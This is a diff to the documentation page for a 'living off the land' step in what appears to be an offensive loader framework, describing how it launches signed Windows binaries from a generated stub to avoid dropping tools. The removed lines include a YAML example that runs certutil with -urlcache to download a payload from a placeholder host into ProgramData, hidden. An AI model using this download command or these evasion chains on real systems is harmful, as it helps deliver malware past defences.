@@ -3,16 +3,6 @@
 *Launches a signed system binary or arbitrary command with attacker-chosen
 arguments, so the action runs under a trusted LOLBin instead of a dropped tool.*
 
-## Metadata
-
-| | |
-|---|---|
-| **ATT&CK** | T1218 (System Binary Proxy Execution), T1105 (Ingress Tool Transfer) |
-| **Stability** | Stable |
-| **Category** | Control |
-| **YAML key** | `living_off_the_land` |
-| **Introduced in** | Multi-stage plans (schema 5) |
-
 ## What it does
 
 Launches a process — a signed Microsoft binary or any command — from the generated stub.
@@ -22,29 +12,6 @@ The intended use is a LOLBin: a signed, already-present system executable
 arguments, so the work happens under a trusted binary instead of a dropped
 payload. It is a Control technique: it does not decrypt, map or run the payload,
 it only orchestrates the chain.
-
-## YAML parameters
-
-| Parameter | Type | Required | Default | Description |
-|-----------|------|----------|---------|-------------|
-| `binary` | string | yes | – | Process to launch. A bare name (no `\` or `/`) is resolved against `System32` at run time; a path is used as is. |
-| `args` | list of strings | no | `[]` | Arguments passed to `binary`. Each is quoted with the `CommandLineToArgvW` rules. |
-| `window` | `hidden` \| `normal` | no | `hidden` | Console/window visibility. `hidden` adds `CREATE_NO_WINDOW`. |
-| `wait` | bool | no | `true` | Wait for the child and return its exit code. `false` detaches and returns `0`. |
-| `timeout_s` | integer | no | `0` | Seconds to wait for the child when `wait: true`. `0` means no limit (`INFINITE`). |
-
-## YAML example
-
-```yaml
-runtime:
-  - technique: living_off_the_land
-    params:
-      binary: certutil.exe
-      args: ["-urlcache", "-f", "http://host/payload.bin", "C:\\ProgramData\\p.bin"]
-      window: hidden
-      wait: true
-      timeout_s: 30
-```
 
 ## How it works
 
@@ -81,6 +48,12 @@ sequenceDiagram
    `INFINITE` when `0`) and `GetExitCodeProcess` return the child's exit code.
    When `false`, the handles are closed and the stage returns `0` immediately.
 5. Both process handles are closed.
+
+## Integration
+
+A **Control** step: it orchestrates the chain and returns control when it
+finishes, so the steps around it keep running. It launches a command (usually a signed system binary) as part of
+the chain.
 
 ## What it evades
 
